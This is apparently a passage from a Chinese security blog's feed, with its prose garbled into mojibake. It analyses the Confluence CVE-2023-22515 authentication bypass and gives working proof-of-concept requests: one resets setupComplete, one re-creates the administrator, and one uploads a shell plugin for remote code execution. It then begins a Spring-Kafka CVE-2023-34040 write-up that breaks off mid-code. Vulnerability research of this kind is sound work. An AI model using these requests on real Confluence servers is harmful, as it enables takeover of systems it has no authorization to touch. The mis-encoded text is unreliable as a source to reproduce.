src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BootstapStatusProviderImpl.png" class><p>è¿™é‡Œæœ‰ç‚¹æ²¡çœ‹æ‡‚ä¿®äº†ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘å…ˆåŠ¨è°ƒè§‚å¯Ÿå…·ä½“æ¥å£æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œæ ¹æ® Struts2 çš„ç‰¹æ€§ï¼Œå»åˆ° <code>struts.xml</code> é‡Œé¢æ‰¾å¯¹åº”çš„ <strong>Interceptor</strong>ï¼Œä¸éš¾æ‰¾åˆ°å…·ä½“å¤„ç†çš„æ‹¦æˆªå™¨æ˜¯ <code>SetupCheckInterceptor</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupInterceptor.png" class><p>å¼€å§‹åŠ¨è°ƒï¼Œçœ‹ä¸€ä¸‹ <code>/setup/setupadministrator.action</code> æ¥å£çš„é€»è¾‘æ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚</p><p>ä¸­é—´èµ°åˆ° <code>com.atlassian.config.ApplicationConfig#isSetupComplete</code> æ—¶ï¼Œåœ¨æ–°ç‰ˆæœ¬çš„ fix é‡Œé¢æ˜¯å¢åŠ äº†è¿™ä¸€æ®µçš„ <code>ReadOnlyApplicationConfig</code> é…ç½®çš„</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSetupComplete.png" class><p>æ‰€ä»¥è¿™é‡Œçš„æ¼æ´åˆ©ç”¨æ€è·¯å¤§æ¦‚å°±æ˜¯å…ˆåŠ¨æ€ä¿®æ”¹ <code>setupPersister</code> æˆ– <code>applicationConfig</code>ï¼Œåœ¨è§¦å‘äº†è¿™ä¸€ç‚¹ä¹‹åï¼Œèƒ½å¤Ÿä¸‹ä¸€æ­¥è®¿é—® <code>/setup/setupadministrator.action</code>ï¼Œé‡æ–°é…ç½®ç®¡ç†å‘˜å¯†ç ã€‚</p><p>è¿™é‡Œå…·ä½“çš„å®ç°å¾ˆæœ‰æ„æ€ï¼Œsu18 å¸ˆå‚…çš„æ–‡ç« è¯´çš„å¾ˆæ˜ç™½ï¼Œæˆ‘å°±ç›´æ¥æ‹¿è¿‡æ¥ç”¨äº†</p><p><a class="link" href="https://su18.org/post/struts2-1/">https://su18.org/post/struts2-1/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>OGNL ä¸­çš„æ ¹å¯¹è±¡å³ä¸º ValueStackï¼ˆå€¼æ ˆï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡è´¯ç©¿æ•´ä¸ª Action çš„ç”Ÿå‘½å‘¨æœŸï¼ˆæ¯ä¸ª Action ç±»çš„å¯¹è±¡å®ä¾‹ä¼šæ‹¥æœ‰ä¸€ä¸ª ValueStack å¯¹è±¡ï¼‰ã€‚å½“Struts 2æ¥æ”¶åˆ°ä¸€ä¸ªÂ <code>.action</code>Â çš„è¯·æ±‚åï¼Œä¼šå…ˆå»ºç«‹Action ç±»çš„å¯¹è±¡å®ä¾‹ï¼Œä½†å¹¶ä¸ä¼šè°ƒç”¨ Action æ–¹æ³•ï¼Œè€Œæ˜¯å…ˆå°† Action ç±»çš„ç›¸åº”å±æ€§æ”¾åˆ° ValueStack çš„å®ç°ç±» OgnlValueStack å¯¹è±¡ root å¯¹è±¡çš„é¡¶å±‚èŠ‚ç‚¹ï¼ˆ ValueStack å¯¹è±¡ç›¸å½“äºä¸€ä¸ªæ ˆï¼‰ã€‚åœ¨å¤„ç†å®Œä¸Šè¿°å·¥ä½œåï¼ŒStruts2 å°±ä¼šè°ƒç”¨æ‹¦æˆªå™¨é“¾ä¸­çš„æ‹¦æˆªå™¨ï¼Œè¿™äº›æ‹¦æˆªå™¨ä¼šæ ¹æ®ç”¨æˆ·è¯·æ±‚å‚æ•°å€¼å»æ›´æ–° ValueStack å¯¹è±¡é¡¶å±‚èŠ‚ç‚¹çš„ç›¸åº”å±æ€§çš„å€¼ï¼Œæœ€åä¼šä¼ åˆ° Action å¯¹è±¡ï¼Œå¹¶å°† ValueStack å¯¹è±¡ä¸­çš„å±æ€§å€¼ï¼Œèµ‹ç»™ Action ç±»çš„ç›¸åº”å±æ€§ã€‚å½“è°ƒç”¨å®Œæ‰€æœ‰çš„æ‹¦æˆªå™¨åï¼Œæ‰ä¼šè°ƒç”¨ Action ç±»çš„ Action æ–¹æ³•ã€‚ValueStack ä¼šåœ¨è¯·æ±‚å¼€å§‹æ—¶è¢«åˆ›å»ºï¼Œè¯·æ±‚ç»“æŸæ—¶æ¶ˆäº¡ã€‚</p></blockquote><p>æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ª OGNL çš„ç‚¹, å¹¶ä¸”è¿™ä¸ªç‚¹èƒ½å¤Ÿä»¥æŸç§æ–¹å¼å»è°ƒç”¨æŸä¸ªç±»çš„ getter &#x2F; setter, ä»¥æ­¤æ¥é…ç½® applicationConfig çš„ setupComplete å­—æ®µ</p><p>äºæ˜¯å» diff è·Ÿ Struts2 æœ‰å…³çš„ä¾èµ–, å³ <code>com.atlassian.struts2_struts-support-1.1.0.jar</code> å’Œ <code>com.atlassian.struts2_struts-support-1.2.0.jar</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff2.png" class><p>å‘ç°ä¿®æ”¹çš„ç±»æ˜¯ <code>SafeParametersInterceptor</code>ï¼Œè¿™ä¸ªç±»ä¼šå¤„ç†æ‰€æœ‰çš„è¾“å…¥ï¼Œæ‰€ä»¥ <code>server-info.action</code> è¿™ä¸ªè¯·æ±‚ä¹Ÿä¼šç»è¿‡å®ƒ</p><p>åŒæ—¶ï¼ŒConfluence ä½¿ç”¨äº† XWork æ¡†æ¶ï¼Œå®ƒå…è®¸é€šè¿‡ HTTP è¯·æ±‚æ¥è®¾ç½® Java å¯¹è±¡çš„å‚æ•°ï¼š<a class="link" href="https://developer.atlassian.com/server/confluence/xwork-plugin-complex-parameters-and-security/">XWork Plugin Complex Parameters and Security<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>XWork allows the setting of complex parameters on an XWork action object. For example, a URL parameter ofÂ <code>formData.name=Charles</code>Â will be translated by XWork into the method callsÂ <code>getFormData().setName(&quot;Charles&quot;)</code>Â by the XWork parameters interceptor. IfÂ <code>getFormData()</code>Â returns null, XWork will attempt to create a new object of the appropriate return type using its default constructor, and then set it withÂ <code>setFormData(newObject)</code></p></blockquote><p>è¿™å°±å…è®¸æˆ‘ä»¬åœ¨è¾“å…¥æ—¶å€™ä¼ å‚ç±»ä¼¼äº <code>?test=a.b.c</code>ï¼ŒåŠ¨è°ƒä¸€ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?a.b.c</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå…ˆåšè¿‡æ»¤ï¼Œè·Ÿè¿› <code>this.filterSafeParameters()</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåŒ…å«å…³é”®å­—æˆ–è€…æ»¡è¶³æ­£åˆ™åŒ¹é…åˆ™è¿”å› false</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterSafeParameters.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BLOCKED_PARAMETER_NAMES: actionErrorsã€actionMessages  </span><br><span class="line">EXCLUDE_CLASS_PATTERN: .*class[^a-z0-9_].*  </span><br><span class="line">SAFE_PARAMETER_NAME_PATTERN: \w+((\.\w+)|(\[\d+\])|(\[<span class="string">&#x27;[\w.]*&#x27;</span>\]))*  </span><br><span class="line">MAP_PARAMETER_PATTERN: .*\[<span class="string">&#x27;[a-zA-Z0-9_]+&#x27;</span>\]</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸åœ¨é»‘åå•å†…ï¼Œæœ€åä¼šè°ƒç”¨ <code>isSafeComplexParameterName()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šæ£€æŸ¥ä¼ å…¥çš„å‚æ•°æ˜¯å¦è°ƒç”¨äº†å½“å‰ action çš„æŸä¸ª getter &#x2F; setterï¼Œå¦‚æœè°ƒç”¨äº†ï¼Œåˆ™åˆ¤æ–­é‡Œé¢æ˜¯å¦æœ‰ <code>ParameterSafe</code> æ³¨è§£ã€‚</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSafeComplexParameterName.png" class><p>å¦‚æœæ²¡æœ‰å®ç° <code>@ParameterSafe</code> æ³¨è§£ï¼Œé‚£ä¹ˆ isSafeMethod å°±ä¼šè¿”å› false</p><p>è¿™ä¹ˆä¸€çœ‹ï¼Œæ¼æ´æˆç«‹éœ€è¦ç»•è¿‡é»‘åå•éªŒè¯ï¼Œå¹¶ä¸”æ»¡è¶³ <code>@ParameterSafe</code> æ³¨è§£ï¼Œåˆ©ç”¨æ¡ä»¶ååˆ†è‹›åˆ»ã€‚ç»§ç»­å¾€ä¸‹èµ°ï¼Œå›åˆ° <code>com.atlassian.xwork.interceptors.SafeParametersInterceptor#doIntercept</code>ï¼Œè·Ÿè¿› <code>super.doIntercept()</code> æ–¹æ³•ã€‚èƒ½å¤Ÿçœ‹åˆ°è¿™é‡Œæ˜¯è·Ÿè¿›åˆ°äº† <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code> æ–¹æ³•ï¼Œå®ƒä¼šé‡æ–°å¤„ç†ä¸€éå‚æ•°ï¼Œè¿™å°±å¯¼è‡´ä¸Šé¢çš„é»‘åå•å®Œå…¨æ²¡ç”Ÿæ•ˆã€‚</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doIntercept.png" class><p>è·Ÿè¿› <code>setParameters()</code> æ–¹æ³•åå…¶å®å°±æ˜¯ S2 å¤„ç† OGNL è¯­å¥çš„é‚£ä¸€å¥—ï¼Œå‚è€ƒ <a class="link" href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setParameter.png" class><p>æ€»çš„æ¥è¯´, å› ä¸º <code>SafeParametersInterceptor.doIntercept()</code> æ–¹æ³•çš„ä¸€äº›é€»è¾‘é—®é¢˜, å¯¼è‡´è¿™ä¸ªç±»è‡ªèº«å¯¹ä¼ å…¥å‚æ•°çš„è¿‡æ»¤å¹¶æ²¡æœ‰ç”Ÿæ•ˆ, æˆ‘ä»¬æœ€ç»ˆè¿˜æ˜¯å¯ä»¥é€šè¿‡Â <code>a.b.c=e</code>Â çš„å½¢å¼å»è°ƒç”¨å½“å‰ action çš„ getter &#x2F; setter, å¹¶ä¸éœ€è¦å…³å¿ƒæ–¹æ³•æœ¬èº«æˆ–è€…å®ƒçš„ returnType æ˜¯å¦ä½¿ç”¨äº†Â <code>@ParameterSafe</code>Â æ³¨è§£</p><p>åˆ°è¿™é‡Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€  OGNL å³å¯ï¼Œè°ƒç”¨æŸä¸ª Action é‡Œçš„ setterï¼Œè®© <code>isSetupComplete=false</code> å³å¯</p><p>ä»¥ ServerInfoAction ä¸ºä¾‹, å®ƒç»§æ‰¿è‡ª ConfluenceActionSupport</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getBootstrapStatusProvider.png" class><p>è¿™é‡Œçš„ <code>getBootstrapStatusProvider()</code> æ–¹æ³•è°ƒç”¨äº† <code>BootstrapStatusProviderImpl.getInstance()</code>ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å» <code>BootstrapStatusProviderImpl</code> é‡Œé¢å¯»æ‰¾è°ƒç”¨é“¾ï¼Œå¯æƒœçš„æ˜¯è¿™é‡Œçš„ <code>setSetupComplete()</code> å·²ç»ç”¨ä¸äº†äº†ï¼Œåªèƒ½æ‰¾å¦å¤–çš„</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupComplete.png" class><p>æœ€ç»ˆæ‰¾åˆ°çš„æ˜¯ <code>getApplicationConfig()</code> æ–¹æ³•ï¼Œè€Œåœ¨ <code>ApplicationConfig</code> ç±»é‡Œé¢å­˜åœ¨ <code>setSetupComplete()</code> æ–¹æ³•å¯ç”¨</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupCompleteEnd.png" class><p>å› ä¸º Confluence çš„æ‰€æœ‰ Action éƒ½ç»§æ‰¿è‡ª ConfluenceActionSupport, æ‰€ä»¥ç†è®ºä¸Šåªè¦è®¿é—®ä»»æ„ä¸€ä¸ªä½¿ç”¨äº† SafeParameterInterceptor çš„è·¯ç”±, æ— è®ºæ˜¯ GET è¿˜æ˜¯ POST æ–¹æ³•éƒ½èƒ½å¤Ÿåˆ©ç”¨æˆåŠŸ</p><p>äºæ˜¯æœ€åçš„ PoC åº”è¯¥æ˜¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span><br></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œè¦†ç›– <code>setupComplete=false</code> ä¹‹åé‡æ–°æ³¨å†Œç®¡ç†å‘˜</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/setup/setupadministrator-start.action</span><br></pre></td></tr></table></figure><h2 id="0x05-æœªæˆæƒä¹‹åçš„-RCE"><a href="#0x05-æœªæˆæƒä¹‹åçš„-RCE" class="headerlink" title="0x05 æœªæˆæƒä¹‹åçš„ RCE"></a>0x05 æœªæˆæƒä¹‹åçš„ RCE</h2><p>X1r0z å¸ˆå‚…å·²ç»ä»‹ç»äº†ä¸€ç§ RCE çš„æ–¹æ³•ï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶æœ‰é™ï¼Œéœ€è¦ webç›®å½•å¯å†™å¹¶ä¸”é«˜æƒé™ç”¨æˆ·</p><p>å…¶å®æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•ï¼Œçœ‹åˆ°ï¼š<a class="link" href="https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html<i class="fas fa-external-link-alt"></i></a></p><p>å¯ä»¥é€šè¿‡ä¸Šä¼ æ’ä»¶å®ç° RCEï¼Œåˆ©ç”¨å·¥å…·githubä¸Šå·²ç»å­˜åœ¨äº†ï¼š<a class="link" href="https://github.com/AIex-3/confluence-hack/">https://github.com/AIex-3/confluence-hack/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/plugins/servlet/upm</span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/managePlugins.png" class><p>ä¸Šä¼  plugin_shellplug.jarï¼Œè®¿é—® <code>/plugins/servlet/com.jsos.shell/ShellServlet</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/">http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-22515 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-34040 Kafka ååºåˆ—åŒ– RCE</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/</id>
    <published>2023-11-27T01:47:49.000Z</published>
    <updated>2023-11-27T01:52:03.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34040-Kafka-ååºåˆ—åŒ–-RCE"><a href="#CVE-2023-34040-Kafka-ååºåˆ—åŒ–-RCE" class="headerlink" title="CVE-2023-34040 Kafka ååºåˆ—åŒ– RCE"></a>CVE-2023-34040 Kafka ååºåˆ—åŒ– RCE</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>Spring Kafka æ˜¯ Spring Framework ç”Ÿæ€ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œç”¨äºç®€åŒ–åœ¨ Spring åº”ç”¨ç¨‹åºä¸­é›†æˆ Apache Kafka çš„è¿‡ç¨‹ï¼Œè®°å½• (record) æŒ‡ Kafka æ¶ˆæ¯ä¸­çš„ä¸€æ¡è®°å½•ã€‚</p><p>å—å½±å“ç‰ˆæœ¬ä¸­é»˜è®¤æœªå¯¹è®°å½•é…ç½® <code>ErrorHandlingDeserializer</code>ï¼Œå½“ç”¨æˆ·å°†å®¹å™¨å±æ€§ <code>checkDeserExWhenKeyNull</code> æˆ– <code>checkDeserExWhenValueNull</code> è®¾ç½®ä¸º true(é»˜è®¤ä¸º false)ï¼Œå¹¶ä¸”å…è®¸ä¸å—ä¿¡ä»»çš„æºå‘å¸ƒåˆ° Kafka ä¸»é¢˜ä¸­æ—¶ï¼Œæ”»å‡»è€…å¯å°†æ¶æ„ payload æ³¨å…¥åˆ° Kafka ä¸»é¢˜ä¸­ï¼Œå½“ååºåˆ—åŒ–è®°å½•å¤´æ—¶è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>2.8.1 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 2.9.10<br>3.0.0 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 3.0.9</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¿™ä¸€ä¸ªæ¼æ´æ‰€å½±å“çš„ç»„ä»¶å…¶å®æ˜¯ Spring-Kafkaï¼Œä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´å¹¶ä¸ç®—æ˜¯ kafka çš„æ¼æ´ï¼Œåº”è¯¥ç®—æ˜¯ Spring çš„æ¼æ´ã€‚</p><h3 id="æ¼æ´å‰ç½®çŸ¥è¯†"><a href="#æ¼æ´å‰ç½®çŸ¥è¯†" class="headerlink" title="æ¼æ´å‰ç½®çŸ¥è¯†"></a>æ¼æ´å‰ç½®çŸ¥è¯†</h3><p>å…ˆæ¥çœ‹ä¸€çœ‹ SpringBoot å’Œ Kafka æ˜¯æ€ä¹ˆå®Œæˆé€šè®¯&#x2F;æ¶ˆè´¹çš„</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SpringBootToKafka.png" class><p><strong>å·¥ä½œæµç¨‹å¦‚ä¸‹</strong></p><p>1ã€ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ° Kafka é›†ç¾¤ä¸­çš„æŸä¸ª Brokerï¼ˆä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªï¼‰<br>2ã€Kafka é›†ç¾¤å°†æ¶ˆæ¯å­˜å‚¨åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†åŒºä¸­ï¼Œå¹¶ä¸ºæ¯ä¸ªåˆ†åŒºç»´æŠ¤ä¸€ä¸ªåç§»é‡<br>3ã€æ¶ˆè´¹è€…è®¢é˜…ä¸€ä¸ªæˆ–å¤šä¸ªä¸»é¢˜ï¼Œå¹¶ä» Kafka é›†ç¾¤ä¸­è¯»å–æ¶ˆæ¯ã€‚<br>4ã€æ¶ˆè´¹è€…æŒ‰é¡ºåºè¯»å–æ¯ä¸ªåˆ†åŒºä¸­çš„æ¶ˆæ¯ï¼Œå¹¶è·Ÿè¸ªæ¯ä¸ªåˆ†åŒºçš„åç§»é‡ã€‚</p><ul><li>ErrorHandlingDeserializerï¼šæ˜¯ Kafkaä¸­çš„ä¸€ç§ååºåˆ—åŒ–å™¨ï¼ˆDeserializerï¼‰ï¼Œå®ƒå¯ä»¥åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¤„ç†å¼‚å¸¸å’Œé”™è¯¯ã€‚</li><li>checkDeserExWhenKeyNull &amp;&amp; checkDeserExWhenValueNullï¼šæ˜¯ Kafka ä¸­çš„ä¸€ç§åºåˆ—åŒ–å™¨ï¼ˆSerializerï¼‰ï¼Œå®ƒå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ£€æŸ¥é”®ï¼ˆkey&#x2F;valueï¼‰æ˜¯å¦ä¸º nullï¼Œå¹¶åœ¨å‘ç°å€¼ä¸º null æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚</li></ul><p>å†ç®€å•æ•´ç†ä¸€ä¸‹æ¼æ´æ¡ä»¶</p><blockquote><p>åœ¨å—åˆ°å½±å“çš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤æœªå¯¹è®°å½•é…ç½® <code>ErrorHandlingDeserializer</code><br>å®¹å™¨å±æ€§ <code>checkDeserExWhenKeyNull</code> æˆ– <code>checkDeserExWhenValueNull</code> è®¾ç½®ä¸º true</p></blockquote><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å…¶ä¸­éœ€è¦æˆ‘ä»¬èµ·ä¸€ä¸ª Kafka çš„æœåŠ¡ï¼Œç”¨æ¥æ¥æ”¶æ¶ˆæ¯ï¼Œæœ¬æœºä¸Šèµ·æ¯”è¾ƒéº»çƒ¦ï¼Œå¯ä»¥åœ¨ vps ä¸Šç”¨ docker è¿…é€Ÿæ­å»ºï¼Œä¸”éœ€æ³¨æ„ï¼ŒKafka è¦èƒ½å¤Ÿæ¥å—å¤–è¿ï¼Œ<code>docker-compose.yml</code> å¦‚ä¸‹</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">zookeeper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2181:2181&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zookeeper</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wurstmeister/kafka</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9092:9092&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9094:9094&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_HOST_NAME:</span> <span class="number">124.222</span><span class="number">.21</span><span class="number">.138</span></span><br><span class="line">      <span class="attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="string">zookeeper:2181</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENERS:</span> <span class="string">PLAINTEXT://0.0.0.0:9092,SSL://0.0.0.0:9094</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="string">PLAINTEXT://124.222.21.138:9092,SSL://124.222.21.138:9094</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="string">PLAINTEXT:PLAINTEXT,SSL:SSL</span></span><br><span class="line">      <span class="attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="string">PLAINTEXT</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kafka</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Spring Kafka çš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å¯ä»¥é€šè¿‡ä½¿ç”¨ Spring Kafka æä¾›çš„ <code>KafkaTemplate</code> å’Œ &#96;&#96;@KafkaListener&#96; æ³¨è§£æ¥ç¼–å†™ã€‚</p><p>ç”Ÿäº§è€…å¯ä»¥ä½¿ç”¨ <code>KafkaTemplate</code> æ¥å‘é€æ¶ˆæ¯åˆ° Kafka é›†ç¾¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.support.SendResult;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFuture;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;  </span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/producer&quot;)</span>  </span><br><span class="line"><span 